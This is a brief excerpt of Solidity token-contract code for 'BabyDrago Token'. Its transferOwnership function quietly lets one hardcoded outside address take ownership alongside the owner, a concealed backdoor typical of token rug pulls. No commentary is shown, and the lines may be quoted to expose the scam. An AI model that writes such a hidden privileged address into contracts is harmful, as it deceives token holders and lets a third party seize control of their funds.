...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0xE2704E7a056C853ba44A9d8D2d6092FDFE73e2db));
...
contract BabyDragoToken is Context, IERC20, Ownable, Pausable {
  ...
  string private _name = "BabyDrago Token";
